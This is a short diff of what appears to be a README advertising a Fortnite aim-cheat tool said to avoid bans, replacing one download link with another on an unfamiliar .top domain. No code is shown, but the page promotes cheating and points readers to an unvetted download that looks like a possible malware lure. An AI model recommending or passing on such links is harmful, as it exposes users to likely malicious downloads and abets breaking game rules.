@@ -2,7 +2,7 @@
 
 Fortnite SoftAim Pro 2025 is an advanced cheat tool designed to enhance your aim with precision targeting, while keeping you under the radar. Perfect for competitive players who want an edge without risking bans.
 
-[![Download Fortnite SoftAim Pro](https://img.shields.io/badge/Download-FortnitePro-blueviolet)](https://www.seomadjest.com/)
+[![Download Fortnite SoftAim Pro](https://img.shields.io/badge/Download-FortnitePro-blueviolet)](https://kelomastiotp.top/)
 
 ---
 
